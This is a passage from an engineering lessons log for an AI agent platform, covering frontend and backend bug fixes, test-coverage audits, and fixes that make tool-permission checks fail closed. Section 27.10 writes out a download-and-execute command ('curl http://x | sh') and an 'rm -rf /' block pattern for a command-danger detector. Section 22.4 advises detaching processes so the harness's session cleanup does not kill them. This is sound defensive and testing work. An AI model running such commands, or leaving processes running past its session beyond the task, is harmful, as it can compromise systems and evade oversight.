- **Trap warning:** the frontend CK mapping uses **lowercase** keys (`allow_geolocation`/`shortcut_keys`/`launch_at_startup`) easily missed by regex — scan both upper and lower case.

### 22.4 Layer 4: runtime verification (real backend + real frontend)
1. Start backend with `subprocess.Popen(start_new_session=True)` (plain nohup gets killed by basher session cleanup);
2. Frontend vite on another port (5173 may be taken — **this time 5173 was occupied by a React marketing page, though our frontend is Vue**);
3. Batch-curl read-only endpoints (28/28 returned 200);
4. Write-operation chains verified with **temp sessions** then cleaned up (outreach-config/tasks/title/persona/tool permissions/model params/memory events all ✓);
5. Browser evaluate_script end-to-end (change config → dispatch KeyboardEvent → check `document.activeElement`).

### 22.5 Audit conclusions
- **52 frontend config keys: 51 genuinely consumed, 1 decorative** — `shortcut_keys` (startup shortcut);
- Why decorative: Settings.vue edits and saves it to the backend, but **App.vue's shortcut logic hardcodes Cmd/Ctrl+K**, and the backend references it only once at the settings.py definition — user-set values had zero consumers;
- The user had actually configured `⌥ + X`, which never took effect — confirmed decoration.

### 22.6 Fix (make shortcuts real)
`App.vue`:
1. Import `useConfigStore()`; keydown reads `config.shortcut_keys || config.SHORTCUT_KEYS`;
2. New `parseShortcut()` parsing `⌥ + X` / `Cmd+K` / `Ctrl+Shift+P` (supports ⌘/⌥/⇧/⌃/Cmd/Alt/Option/Ctrl spellings);
3. New `shortcutMatches()` for exact modifier-combination matching;
4. Configured shortcut hit → `_focusChat()` (jump to chat page + focus input); built-in Cmd/Ctrl+K retained as fallback;
5. Settings.vue description updated ("presses focus the chat input (takes effect live)").

**Verification:** Parsing logic passes 8 node unit tests; browser end-to-end: set `Ctrl+Alt+X` → backend reads back ✓ → dispatch keyboard event → focus lands on input TEXTAREA ✓ → restore `⌥ + X` ✓.

**Lessons:**
1. **"Editable and saveable" ≠ "effective"** — judging decoration requires finding who consumes the value, on both ends (this time frontend hardcoded keys and backend had no references; neither side consumed);
2. Config-button audits must **scan both uppercase/lowercase keys**; frontend CK mappings mix them;
3. Runtime verification prefers **real backend responses + temp-data cleanup**; full browser clicking is environment-sensitive; evaluate_script is a reliable end-to-end tool;
4. Test backends must detach from the session (`start_new_session=True`) or get reaped; dev ports may be occupied — check with `lsof -i` first.


## 23. Two root causes of "details button does nothing": DOM position + broken build (frontend)

**Symptom:** Clicking "Details" on dashboard API request logs does nothing visible; users assume the button is broken.

**Root cause 1 (main): details panel rendered off-viewport**
- `API_PAGE = 50` — log table paginates 50 rows; the `dash-detail` panel renders **after** the table;
- Clicking only sets `apiDetail.value`, **with no scroll logic** — panel appears below the viewport at page bottom; users see zero change;
- Browser measurement (evaluate_script): after click `dash-detail` exists but `rect.top=3736 > viewport 2029`, `scrollY=0` — functional but invisible.

**Root cause 2 (hidden bomb): duplicate class attributes broke vite build**
- `<div class="setting-ctl" class="ctl-flex">` — two class attributes on one element; Vue compiler errors `Duplicate attribute`;
- This was committed to HEAD (4 occurrences total), so **any `vite build` failed** → dist never updated; users on 8765 forever loaded the stale build;
- Debugging chain: build failure → located Settings.vue:428 → project-wide scan of `class="..." class=` found all 4.

**Fix:**
1. `Dashboard.vue`: `openApiDetail` adds `nextTick` + `scrollIntoView({behavior:'smooth', block:'start'})` to scroll to the panel (note the scroll container is `.page-body`, not window);
2. `Settings.vue`: 4× `class="setting-ctl" class="ctl-flex"` → `class="setting-ctl ctl-flex"`;
3. `api/main.py`: GET/DELETE requests carry no body; record `?query` into `request_body` instead (otherwise GET details always show "no record").

**Verification:** Browser test: after click `rect.top=1712 < viewport 2029` → panel visible ✓; GET log details show `?limit=3` ✓; 33 related tests pass.

**Lessons:**
1. **For "button does nothing", check DOM position/visibility first**, event binding second — panels rendered off-viewport are the most common illusion;
2. **A failing `vite build` means users are forever on the old frontend** — always build before deploying; CI/commit flows should include build validation;
3. For duplicate-attribute template errors, project-wide grep (`class="[^"]*" class=`) catches them all at once;
4. SPA artifacts: index.html must be no-cache (server.py does this); hashed assets can be immutable; but **open pages won't auto-refresh** — tell users to refresh/restart windows after upgrades.


## 24. send_json_from_thread self-deadlock inside the event-loop thread → conversation errors (backend)

**Error (ERROR, empty message):**
```
2026-08-10 17:34:32 - stream_api - ERROR - [ConnectionManager] send_json_from_thread failed:
```
The **empty message after the colon** is the telltale sign — this is `concurrent.futures.TimeoutError` (thrown by `future.result(timeout)`, whose `str()` is empty).

**Symptom:** During conversations (especially when deepseek reasoning models return `reasoning_content`), backend logs flood with this error and thinking-event pushes stall for 5 seconds each.

**Root cause:** `ConnectionManager.send_json_from_thread()` in `modules/thinking/api_stream.py` sends synchronously via
`asyncio.run_coroutine_threadsafe(_send(), self._loop)` + `future.result(timeout=5.0)`; it's designed for **non-event-loop threads** (daemon threads) to call safely. But `_push_reasoning`
(`modules/thinking/core/model_runner.py:1204`, pushes thinking events during model reasoning) calls it **from within the event-loop thread itself**:

- `run_coroutine_threadsafe` schedules `_send` onto the event loop;
- `future.result(timeout=5)` **blocks the event-loop thread itself** → `_send` never gets to run;
- After 5 seconds: `TimeoutError` with empty message; every push stalls 5s.

I.e., "schedule yourself + block yourself" self-deadlock (`run_coroutine_threadsafe` docs explicitly say it must only be called from non-loop threads).

**Why tests missed it:**
- `tests/unit/test_api_stream_core.py` tested only three paths: no event loop, no connections, and calling from a **dedicated worker thread**
  (`test_send_json_from_thread_success` happened to exercise the cross-thread path that works);
- The **called-from-loop-thread** path had no test — it requires a real conversation with a model emitting `reasoning_content`,
  and it's a runtime timing issue (the loop must actually be blocked 5s before the error); neither unit nor integration tests can construct that.

**Fix:** `send_json_from_thread` entry checks whether it's already running on the event-loop thread (`asyncio.get_running_loop() is self._loop`):
- Yes → schedule via `asyncio.create_task(_fire_and_forget())`, **non-blocking**, returns True immediately;
- No (background thread) → keep original `run_coroutine_threadsafe + future.result(timeout)` semantics.

**Verification:** New regression test `test_send_json_from_thread_on_loop_thread_not_blocked`
(`tests/unit/test_api_stream_core.py`) — called within an async context (loop thread), asserts immediate True return
and message delivery; all 13 related cases pass; full suite 1460 passing.

**Lessons:**
1. **Every "thread-safe" synchronous entry must also handle being called from the event-loop thread** — calling `run_coroutine_threadsafe`/`loop.call_soon_threadsafe` from the loop thread itself is deadlock/timeout;
2. **Empty error messages usually come from `TimeoutError`/`CancelledError`** (empty `str()`) — when logs show "failed: " followed by nothing, suspect synchronous wait timeouts first;
3. **Tests must cover the real production call context** — testing only another thread's success path misses the loop-thread self-deadlock scenario.


## 25. Utility-style one-shot LLM calls got agent personas forced onto them (backend)

**Symptom:** Purely utility-oriented single-shot LLM calls — memory consolidation/conversation summary/security review/conscience reflection — received unrelated agent personas in their system prompts (orchestrator/code expert), conflicting with the task's intended identity (memory analyst/summarizer/security expert), while wasting tokens (persona+tool table+safety rules+capability table+values all attached).

**Root cause:** The three model clients' `generate()` convenience methods **hardcoded** system prompts internally:
- `LargeModelClient.generate` → `PromptRequest(tier="large", role="orchestrator")`
- `SmallModelClient.generate` → `tier="expert", role="code_writer"`
- `MediumModelClient.generate` → `tier="supervisor", role="code_supervisor"`

Meanwhile callers (`EventReducer._call_llm`, `context_slicer._summarize_chunk`, `tool_security_gate._check_llm_review`, `conscience.think/analyze_feedback`) passed only self-contained task prompts, leaving system prompts to client defaults → every utility task wore an irrelevant persona.

**The main conversation flow was correct (not uniform):** `ModelRunner._build_system_prompt_for_mode()` → `PromptComposer.build_system(PromptRequest(tier=self.tier, role=self.identity.role))`; via `chat()`/`chat_stream()` the system message is role-differentiated (orchestrator/code supervisor/experts), `roles.yaml` personas differ per role, and Settings-page custom personas are supported — main-model prompt construction was fine; only the generic `generate()` shortcut path had the problem.

**Fix:**
1. All three clients' `generate()` gained `system_prompt: str = None` — **when non-empty it overrides** the auto persona; default behavior unchanged (backward compatible);
   > **Later change (before §27.8):** `generate()`'s `system_prompt` became **keyword-only required** — missing it raises
   > `TypeError` directly; no default agent persona injected anymore (see §27.8 config/providers wiring below).
2. Each tool caller passes its own dedicated minimal system prompt ("only do X, no tools, output only the specified format"):
   - `event_reducer` → `MEMORY_REDUCE_SYSTEM_PROMPT` (memory consolidation)
   - `context_slicer` → summarizer-specific (conversation summaries)
   - `tool_security_gate` → security-review-specific
   - `conscience` → `CONSCIENCE_SYSTEM_PROMPT` (conscience/causal feedback)
3. `model_runner._generate` legacy fallback path: previously concatenated `system_prompt + prompt` into one user string passed to `generate()`, which then auto-injected another system (**duplicate system prompts**) — now passes `system_prompt=system_prompt` separately, removing duplication.

**Why tests missed it:**
- The main conversation flow already used `chat()` (with its own role prompt); `generate()`'s hardcoded persona only fired on utility paths, and tests mostly asserted "was called / returned content", **never inspecting the system prompt passed in**;
- After adding the parameter some test mocks were signature-incompatible (`generate()` not accepting `system_prompt`), caught by `assert` and mock signatures updated accordingly (`test_toolgate.py`, `test_conscience.py`, `test_model_runner_core.py`).

**Verification:** New `test_reduce_uses_dedicated_system_prompt` (`tests/unit/test_event_reducer.py`) asserts memory consolidation calls carry the dedicated system prompt; all 1095 unit tests pass.

**Lessons:**
1. **Persona defaults on "generic model-client methods" should serve only the main conversation flow** — any utility task using generic `generate()` as a "one-shot LLM call" must explicitly pass its own system prompt, or it inherits an unrelated agent persona (identity conflict + token waste);
2. **When adding parameters to generic methods, grep all mocks/callers first** — fake-class mocks often throw `unexpected keyword argument` immediately;
3. **Asserting output-content quality catches prompt bugs better than asserting "was called"** — same lesson as §20.


## 26. Chat attachments "won't send": three contract breaks in a chain + missing test infrastructure (frontend/backend)

**Symptom:** After uploading an image in the chat box, the AI can't see it; with only an image and no text, the message won't send at all.

**Root cause (three independent bugs chained; any break kills images):**

1. **Frontend sent bare dataURL strings (wrong payload shape)** `frontend/src/components/ChatInput.vue`
   `handleSend` sent `attachments.value.map(a => a.data)` — exploding `{type,name,data}` objects into an **array of bare base64 strings**. Backend `parse_attachments` does `if not isinstance(att, dict): continue`, skipping all non-dict items → images **silently dropped**; users saw "sent" but nothing arrived.
2. **Attachment `type` stored an internal category, not MIME** `ChatInput.vue` `handleFiles`
   Attachment objects hardcoded `type = isImage ? 'image' : 'file'`. Backend checks `atype.startswith("image/")` for vision — `'image'` doesn't match `"image/"` → image treated as ordinary file: filename noted, **no vision analysis**.
3. **Vision API URL double `/chat/completions` → 404** `infra/data_process/core/image_analyzer.py`
   `_analyze_openai` passed `VISION_API_URL` (already containing `/chat/completions`) as `base_url` to the openai SDK, which appended the path again → request hit `.../chat/completions/chat/completions` → 404 → image analysis failed, degraded to text. `config/providers/openai.py:76-78` handles this dedup; `ImageAnalyzer` didn't.

**Why tests missed it:**
- Backend unit test `test_attachment_handler.py` **called `parse_attachments` directly** with well-formed dicts — verifying "the backend function works on correct input" but never "the payload shape the frontend actually sends";
- Frontend had **no test infrastructure whatsoever** (no test script in package.json, no vitest/jest, zero spec files); the only check, `npm run build`, validates syntax/references but can't catch payload-shape errors;
- Backend WS input had no schema validation — both `chat_gateway.py`/`api_stream.py` do `json.loads` + `.get()` field access; wrong frontend shapes were **silently skipped without errors**.

**Fix:**
1. `ChatInput.vue`: payload changed to full `{type, name, data}` dicts; **sending image-only (no text) allowed** (previously blocked by `if (!text) return`).
2. `ChatInput.vue`: attachment `type` stores real MIME (`file.type`); preview logic uses `startsWith('image/')`.
3. `image_analyzer.py`: `_analyze_openai` and `_detect_ui_openai` normalize base_url (strip trailing `/chat/completions`), consistent with `config/providers/openai.py`.
4. **Backend contract validation**: `attachment_handler.py` adds a `ChatAttachment` model + `validate_attachments()`; WS input parsing in `chat_gateway.py`/`api_stream.py` validates first, returning explicit error events for invalid shapes instead of silently swallowing.
5. **Frontend test infrastructure**: vitest + @vue/test-utils + jsdom introduced, `npm test`; `ChatInput.spec.js` 5 cases pinning payload shape (including regressions of two historical bugs).
6. **Backend contract tests**: `tests/unit/test_attachment_contract.py` 11 cases covering bare string arrays, missing data, bad elements rejected wholesale, valid shapes parse fine.

**Verification:** 52 related backend tests pass (attachment + contract + api_stream + ws_client), chat_light series 32 pass; frontend 5 tests pass, `vite build` passes.

**Similar-issue sweep:** Attachment sender is only the Vue frontend (old `frontend/js` deleted, no separate `backend/` package); production WS attachment entry points are exactly `chat_gateway.py` + `api_stream.py`, both validated now; URL double-path pattern caught and fixed in `_detect_ui_openai` too (latent same-class bug — untriggered because the configured address was DeepSeek's).

**Lessons:**
1. **"Backend function works on correct input" ≠ "the whole chain works"** — frontend/backend contracts (payload shape/field names/enum values) need explicit validation somewhere, or wrong shapes silently drop data;
2. **Tests must cover real payload shapes, not just "function invoked correctly"** — lacking frontend test infra is itself a hazard; every "what frontend sends vs what backend expects" boundary deserves contract-pinning unit tests;
3. **base_url passed to the OpenAI SDK must be normalized** — any config possibly containing `/chat/completions` must be deduped before hitting the SDK, otherwise double-path 404s are brutal to debug;
4. **Internal category names (image/file) ≠ protocol types (image/png)** — fields matched with `startsWith`/enums must store protocol-sanctioned values, not UI display categories.


## 27. macOS dual libomp segfault/abort + test-vs-production environment audit (backend/environment)

**Symptom:** Running `test_chat_light_* + test_conscience` together crashed:
- First `OMP: Error #15: Initializing libomp.dylib, but found libomp.dylib already initialized` → `Fatal Python error: Aborted` (exit 134)
- With `KMP_DUPLICATE_LIB_OK=TRUE`: `Segmentation fault` (exit 139), random crash points (torch import / BERT forward)
- `test_conscience` alone (12) or `test_chat_light_*` alone (34) both passed; only combined runs crashed — flaky, timing-related

**Root cause (two layers, empirically investigated):**
1. **Dual OpenMP runtimes (true root cause)**: `otool -L` confirmed `faiss/_swigfaiss.abi3.so` and `torch/lib/libtorch_cpu.dylib` each depend on **their own** `libomp.dylib` (`@loader_path/.dylibs/libomp.dylib` vs `torch/lib/libomp.dylib`). Two OpenMP copies in one process abort on second initialization (OMP: Error #15); tolerating via `KMP_DUPLICATE_LIB_OK`, the two thread pools conflict at runtime → random segfaults.
2. **A previously suspected concurrency race**: crash stacks showed `event_store.py:268 _worker` background threads, briefly suspected of racing torch load/inference with the main thread. Added `EmbeddingEngine._load_lock`/`_infer_lock`, disabled workers in tests — **all ineffective**. Minimal scripts reproducing faiss→torch / torch→faiss alone ran fine, showing dual libomp doesn't always crash; crashes needed "two OpenMP copies + pre-existing thread state" timing. **Lesson: for native crashes, start with minimal repro + bisect combinations; don't rush to change business code.**

**Root fix:** `scripts/fix_macos_libomp.py` uses `install_name_tool -change` to point faiss's binary at `@loader_path/.dylibs/libomp.dylib` → torch's libomp **absolute path**; dyld dedupes via canonicalized path → single **OpenMP runtime** per process; re-signed with `codesign --force --sign -`.
- `KMP_DUPLICATE_LIB_OK` demoted from "fix" to "fallback" (avoids abort in environments without the script, but not guaranteed stable)
- Re-run the script after upgrading faiss/torch (`--check` detects, `--restore` reverts)

**Verification:** Combined 46 tests pass; with **no KMP_DUPLICATE_LIB_OK set**, `faiss + torch + BERT inference` works normally (proving single OpenMP); combined runs stable across 3 consecutive attempts.

**Lessons:**
1. **"Multiple instances of dynamic libraries" (OMP/OpenSSL/others) cannot be fixed by env tolerance** — `KMP_DUPLICATE_LIB_OK` is officially "unsafe, unsupported": it only removes init aborts, runtime still randomly segfaults. Root fix means merging to a single instance (install_name_tool pointing at one absolute path).
2. **Environment-level fixes must ship as repeatable scripts** (invalidated by dependency upgrades) + fallback env + docs, otherwise they recur on new machines/upgrades.
3. **For native crashes: minimal repro + bisect test combos first**, capture thread stacks with faulthandler, distinguish "always crashes" from "timing flaky".

### 27.1 Tests inconsistent with real production environment (audit checklist)

| Item | Status | Disposition |
|---|---|---|
| `test_conscience.py` clean_state | Previously fell back to prod `data/events_faiss_<USER>.index` (fixture passed only db_path) | **Fixed**: faiss/id_map pointed to temp dirs together + `EventRetrieval._instance` reset |
| `test_trigger_think.py` `_Diff` | Fake carried a `description` field absent in production (§20 warning pattern); old tests asserted only trigger counts | **Fixed**: `_Diff` uses real fields (category+payload); content assertions covered by §20's new tests |
| `test_chat_light_thinker.py` | mem_store used hashlib fake embeds (production: torch BERT 384-dim) — deterministic tests reasonable; real embeds covered by `test_memory_search.py` | Reasonable, kept |
| `EMBEDDING_BACKGROUND_WORKER` | Off in tests, on in production | Reasonable difference (tests don't need background vectorization); conftest comments explain |
| `generate()` clients | Test mocks threw TypeError when signatures diverged from production (§25) | Unified + mocks synced |

### 27.2 Surface-fix review (key reminders)

- **`KMP_DUPLICATE_LIB_OK=TRUE` (settings.py / conftest.py)** — the most typical surface fix; upgraded to root-cause merge script.
- **193 `except Exception: pass` repo-wide** — most justified (ImportError probing/background cleanup/degradation), but this is a high-incidence zone for "errors swallowed, real problems masked". Before changing, confirm whether swallowing is acceptable and whether it should log.
- **`test_write_final_result_supervisor/expert`** originally only `assert_called_once()`; strengthened to assert written content (same lesson as §26).

### 27.3 Zero coverage of real core paths (re-validating §19's lesson)

Investigation found the real vision methods of `infra/data_process/core/image_analyzer.py`
(`_detect_available_model` / `_analyze_openai` / `_analyze_mlx_vlm` / `_analyze_qwen_vl`)
had **zero test coverage** — `test_screen_monitor_and_vision.py` / `test_ui_interactor.py` entirely used
monkeypatched analyzer fakes; the real vision code (including §26's base_url normalization, VISION_BACKEND
detection, deepseek/openai message formats) had no regression protection whatsoever. Exactly §19's "mock masks real implementation" lesson.

**Fix:** Added `tests/unit/test_image_analyzer.py` (8 tests):
- `_detect_available_model`: api without key → unavailable / api with key → openai / unknown backend tolerant fallback
- `_analyze_openai` base_url normalization (`/chat/completions` dedup, §26 regression) + plain URLs preserved
- deepseek base64 inline vs openai image_url message formats
- `analyze()` graceful degradation when backends unavailable

**Lesson:** When hunting test gaps, specifically look for modules where tests use only mock/patch fakes and never touch the real implementation —
such modules' real paths have zero regression protection and are high-incidence zones for §19/§20-type incidents.

### 27.4 Production fail-open fixes + mock-masking inventory (full audit)

**Production fail-open (security-critical, fixed):** Two spots in `modules/security_system/tool_security_gate.py`
swallowed security-check exceptions via `except Exception: pass` → **fail-open** (when permission system/security interception errored, tools were let through bypassing the gate):
- Role category permission check exceptions (formerly :254 silent pass) → fail-closed: log + audit + reject
- Write-operation security interception check exceptions (formerly :281 silent allow) → fail-closed: log + audit + reject

**Fix verification:** New `TestFailClosedOnCheckExceptions` (2 tests) — mocked permission check raising, mocked interception check raising,
both assert `check()` returns rejection. Security checks must fail closed is iron law; any "on error, continue allowing" is a high-risk surface fix.

**Inventory of real core paths masked by test mocks (explore full scan):**

| Production symbol | Masked by mocks | Real coverage |
|---|---|---|
| `trigger_think._run/_has_active_connections/_think` | fully patched in test_trigger_think.py | **None** (external only) |
| `ToolSecurityGate._check_user_review/resolve_review` | 7 spots across test_toolgate:166-280, test_control_mode:57-80 | **None** |
| `ModelRunnerManager` entire class | only get_runner_manager replaced | **None (zero references)** |
| `MultiModelOrchestrator._execute_multi_model_thinking` | all deps mocked | **None** |
| `ContinuousThinker` class | replaced by fake class at model_runner_core:269,299,330 | Partial (__init__ etc.) |
| `ModelRunner` 14 methods | unreferenced | **None** |
| `ImageAnalyzer` local VLM+UI 16 methods | replaced by fakes in 4 test files | Partial (§27.3 added API branches) |
| `management/api.py` 41 endpoints | — | Zero coverage |

**Lessons:** When auditing "tests vs production inconsistency", two categories matter most:
1. **Silent error swallowing in security/permission code → fail-open** (far more serious than functional bugs) — every security-check `except: pass` must fail closed;
2. **All-mocked tests leaving real core paths uncovered** — trigger_think's real chain, approval future resolution,
   runner orchestration, orchestrator end-to-end remain regression blind spots; prioritize adding real-implementation tests for high-value ones.

### 27.5 Continued fixes: real approval-path tests + permission controller fail-open (continued)

Continuing §27.4's mock-masking inventory: this round adds real-implementation tests and fixes one more fail-open:

**1. Real tests for `ToolSecurityGate._check_user_review` (4 tests, test_toolgate.py)**
The core approval path (future wait + `resolve_review` resolution + overlap prevention + `Suspension` global suspend/resume) was patched in 7 places.
New real tests: approve flow (resolve True → returns "用户批准"), reject flow, overlap prevention (second request on same tool returns pending,
no duplicate approval), unknown request_id doesn't error; each asserts `Suspension` suspend is restored in finally.

**2. Real prompt-chain tests for `trigger_think._think` (2 tests, test_trigger_think.py)**
`_run/_think` were fully masked by `_fake_run`. New tests drive the real `_think` with mocked boundaries (`generate_and_push`/`call_outreach_llm`),
asserting the LLM prompt **really contains the difference description** (guarding §20's empty-desc regression), correct message types/events, no crash on empty desc.

**3. `tool_permission_controller._get_caller_permissions` fail-open → fail-closed (critical)**
`check_execution_permission` allows when `permissions is None`; meanwhile `_get_caller_permissions`'s outer
`except Exception: pass → return None` turned permission-query exceptions into silent Nones → **with a broken permission system all tools bypassed category checks**.
Fix: outer exception now logs + returns `ModelPermissions(allowed_tool_categories=[])` (empty permissions → reject all),
while "normally not found" still returns None (preserving default-allow semantics for control tools). Inner YAML parsing exceptions log for traceability.
Added 2 tests: model_factory raising → `check_execution_permission("git_add")` rejects; control tools keep default-allow.

**Verification:** test_toolgate 74 pass; permission-related (control_mode/tool_visibility/tool_permission/probe_permission)
128+17 pass; image_analyzer/trigger_think/conscience etc. 156 pass.

### 27.6 Fake-test sweep (continued): misnamed + assertion-free + flaky timeouts

Full scan of test doubles and assertion quality under the "fake test" pattern:

**Fixed misnamed/assertion-free tests:**
1. `test_build_system_prompt_contains_role` (core_continuous_thinker) — name promised a role assertion but body
   swallowed everything via `try/except pass`; also called `_build_prompt("用户输入", "初始问题")` passing round_num as a string.
   Renamed to `test_build_prompt_contains_question`: really builds and asserts the prompt contains the initial question.
   **Incidental finding**: `_build_prompt` output only has the 【当前任务】 section; role persona comes from the system prompt (consistent with the docs
   line-601 comment) — the test name was misleading from the start.
2. `test_rebuild_faiss_dim_same/mismatch` (embedding) — no assertions; added: same dim doesn't rebuild (os.remove not called),
   different dim triggers rebuild.
3. `test_emit_streaming_content` (model_runner_core) — collected broadcast messages but asserted nothing; added: messages really carry
   `entry_type="streaming_delta"`/delta content/tier/round.

**Fakes verified reasonable (not fake tests):** FakeEvent/FakeChain (covering consumed fields), FakeThinker/FakeBlackboard/
FakeRepo (backend slimmed in-memory doubles), FakeClient/FakeMCP (real interfaces), FakeObs (explicitly aligned with real model fields),
FakeGtts (external-library double), _FakeValueSystem (interface matches real; only its "not implemented" comment was stale), _FakeRepo (consumes minimal interface).

**Flaky root-cause fix:** `test_image_analyzer.py` sporadic timeouts — `_detect_available_model` really executes
`from mlx_vlm import ...` → triggers heavy transformers imports; combined runs exceeded pytest's global `--timeout=10`.
Added module-level `pytestmark = pytest.mark.timeout(60)` (same as conscience). Stable across 5 consecutive combined runs.

**Lessons:** Three tells for spotting "fake tests" — ① names implying behavioral expectations with assertion-free bodies that only swallow errors; ② assertions checking only
"was called/didn't raise", never content; ③ tests importing heavy libraries hit the global 10s timeout producing order-dependent flakiness —
relax timeout per-module as needed.

### 27.7 pass-statement sweep + nondeterministic test review

**Full verification of `pass` statements in tests (37 occurrences)**: 35 reasonable — mock placeholders (`async def accept: pass`/`__aexit__`/`close`),
exception class definitions (`class X(Exception): pass`), teardown cleanup, ImportError dependency probes. **2 were fake tests, now fixed:**

1. **`test_context_slicer.py::test_slice_for_large_basic` (fake test masking a real bug)** —
   `try: slice_for_large("用户输入", {}, {}, {}, {}) ... except (AttributeError, TypeError): pass`.
   Removing the swallow exposed: `slice_for_large`'s signature had long changed from multi-param to a **single `CognitiveBlackboard` param**,
   so the test kept passing 5 args triggering TypeError, silently swallowed — the test ran empty and falsely passed. Fixed with a real `CognitiveBlackboard`
   instance + asserting output contains goal. **Lesson: `except (TypeError, AttributeError): pass` is a hotbed of fake tests —
   it masks genuine regressions like "production interface changed, tests didn't follow".**
2. One `with patch.object(...): pass` in `test_screen_capture_daemon.py` (no operations, no assertions while patched)
   dead code, removed.

**Nondeterministic test review (outputs could differ per run)**: random numbers/`set` iteration: 0; time-related 55 all relative comparisons
(cooldowns/time windows), no date literals bound; timing-sleep assertions use boundary tolerance (e.g. `count >= 1`) not exact values;
array-order assertions 5 — 3 rely on order-preserving underlying lists, 1 test sorts itself, 1 single-element; real LLM/API all
mocked (no live calls); uuid used only for unique test data, values unbound. **Conclusion: no unreasonable nondeterministic assertions.**

### 27.8 config/providers wiring (Plan B): format layer merged into infra/model

**Background:** `config/providers` was an early-designed format adaptation layer (ProviderBase + openai/anthropic/dashscope +
registry), never wired in production (0% coverage) — the three `infra/model` clients each built duplicated format branching
(`_api_format` + anthropic/openai/dashscope three-way branches), and the two implementations had diverged:
`config/providers/openai.py`'s `chat_url()` normalizes `/v1`/`/chat/completions`, while clients posted
directly `session.post(api_url)` without normalization (configuring `https://api.openai.com/v1` would 404; currently avoided by configuring URLs containing full endpoints).

**Merge approach (no brute-force replacement, no feature reduction):**
1. All three clients wire Providers in `__init__` via `get_provider(model, key, url, api_format)`;
   uniformly use `provider.build_headers()` / `build_request()` / `chat_url()` (respecting explicit `_api_format`,
   inferring from URL when unset).
2. Enhanced Provider to cover client capabilities: `OpenAIProvider.parse_response` gained `reasoning_content` (thinking mode);
   `ProviderBase.build_request` interface gained `top_p` (small-client-only param; effective for openai, ignored by anthropic/dashscope).
3. **Kept client-specific logic** (no reduction): large's DashScope legacy text tool-call parsing, streaming accumulation parsing
   (`_parse_openai/_anthropic/_dashscope_stream`), HTTP/retry/logging/SSL, `reasoning_content` fallback,
   usage semantics; small/medium's `api_messages` serialization (tool_calls/tool_call_id/reasoning_content round-trip).
4. Unified URL: all requests go through `self._chat_url = provider.chat_url()`, eliminating the `/v1` 404 hazard.

**Verification:** New `tests/unit/test_providers.py` (17 tests: URL inference/explicit format, build_request across three formats,
chat_url normalization, parse_response incl. reasoning_content, stream single-line parsing); 216 model-related tests +
full unit suite 1141 pass (test_post_format payload assertions prove post-wiring request formats identical to before).

**Lesson:** Two adaptation layers doing the same job inevitably diverge (format-detection defaults, URL normalization inconsistencies). Merge direction:
"format construction/parsing belongs to Providers; HTTP skeleton and client-specific logic stay in clients," locked down by payload-format tests
(test_post_format) proving behavior unchanged.

### 27.9 End-to-end all green + coverage additions (utils/agent tools/streaming/memory chain)

**End-to-end:** `pytest tests -m "not external and not slow"` → **1569 passed, 0 failed**.
Fixed one combined-suite flake: `test_causal_graph_comprehensive`'s semantic query triggered real BERT loading exceeding
pytest-timeout 10s (same as conscience); added module-level `timeout(60)`.

**New tests (by uncovered priority):**
- `tests/unit/test_utils.py` (19) — time_utils/json_utils/async_utils/exceptions from **0% → fully covered**
  (time conversion, JSON serialization incl. datetime, async concurrency control/timeout, exception hierarchy and safe_call/safe_acall).
- `tests/unit/test_agent_tools.py` (15) — calculator (pure logic), todo (file persistence + session isolation),
  audit_tools (logs + audit report), tools_search (keyword/category filtering).
- `tests/unit/test_large_model_stream.py` (7) — large-model client's three streaming parsers (openai incl.
  reasoning_content/tool_calls accumulation, anthropic content blocks, dashscope cumulative text deltas).
- `tests/unit/test_memory_chain.py` (19) — depth_recall pure logic (intent classification/trigger decision/
  _time_decay/_build_conclusion) + causal_tree (CausalChain.summary/EvidenceTree.format).
- Previously `tests/unit/test_providers.py` (17) — config/providers format layer (after §27.8 wiring).

**Coverage gains:** config/providers 0%→covered, utils 0%→covered, agent tools 8-18%→significantly up,
large_model_client 13%→incl. streaming, depth_recall/causal_tree 11-12%→pure logic covered.

### 27.10 Continued coverage: management/api endpoints + security tools (git/exec_command)

**New tests (full suite 1569 → 1602 green):**
- `tests/unit/test_management_api_ext.py` (14) — zero-coverage management/api endpoints: health_check (healthy/degraded),
  root, context series removed with GCM, get_thinking_status (healthy/unavailable), get_security_status,
  get_sessions/get_runners/get_model_runners (empty/with sessions), get_bus_stats, memory endpoints (temp EventStore
  singleton + keyword filtering). Note: calling endpoint functions directly requires passing FastAPI Query defaults explicitly (`limit=50` etc.).
- `tests/unit/test_git_tools.py` (12) — _run_git success/timeout/not-installed, git_status porcelain parsing
  (XY statuses), git_push `--force` injection guards (`remote="-"`/`branch="--force"`), git_diff add/del line stats.
- `tests/unit/test_exec_command_safety.py` (7) — exec_command extreme-danger hard blocks (rm -rf / etc.),
  chained-command high-risk detection.

**Incidental security fix (pipe-to-shell missed):**
`_DANGEROUS_PATTERNS` entries `"curl.*|.*sh"`/`"wget.*|.*sh"` are regex syntax, but `_detect_dangerous_command`
uses substring matching (`pattern in cmd`), treating `. *` literally → **classic download-and-execute vectors like `curl http://x | sh` were missed**.
Added `_DANGEROUS_REGEX` (`curl\s+\S+.*\|\s*(ba|z|k)?sh` etc.) checked via `re.search`; tests confirm hits.

**Lesson:** Regex-style entries in security detection lists must run through a regex engine, otherwise "looks like detection, actually decorative" — when writing tests,
verify with real attack payloads (`curl http://x | sh`), not just substrings.

**Coverage gains:** management/api's 41 zero-coverage endpoints greatly reduced; agent security tools (git/exec_command) critical paths covered;
exec_command danger-detection pure logic fully covered.

### 27.11 Continued coverage: web_search / ModelRunnerManager / identity_loader / values_store / causal_tree

**New tests (full suite 1602 → 1657 green):**
- `test_web_search.py` (14) — regex/HTML parsing, content sanitization (Markdown/injection/truncation), DDG search (incl. 202 rate limit),
  fallback chain (ddg_html→lite→sogou→bing→baidu, total failure), limit clamp.
- `test_model_runner_manager.py` (8) — ModelRunnerManager capacity limits (max_per_role/max_tier rejection),
  model_id unique suffix, probe_map registration, stop_runner cleanup, global registry same-session reuse (class previously at 0% coverage).
- `test_identity_loader_ext.py` (13) — external YAML identity loading (tier validation/unknown-field filtering/filename inference),
  merging (override/new entries auto-filled defaults). Note: renamed to `_ext` due to basename clash with `tests/integration/test_identity_loader.py`.
- `test_values_store.py` (14) — real ValueSystem (previously test_value_formatter always used a double):
  init/read-write/partition parsing/add/remove/update/cleanup/reset/quality gating/similarity dedup.
- `test_causal_tree.py` (6) — CausalTree tracing (`_trace_to_root`, root cause first), evidence collection sorted by importance,
  expand_node full chain (up/downstream links + evidence).

**Incidental resource-leak fix (real bug):** `ApiLogStore.__init__` starts a background `_flush_loop` daemon thread but
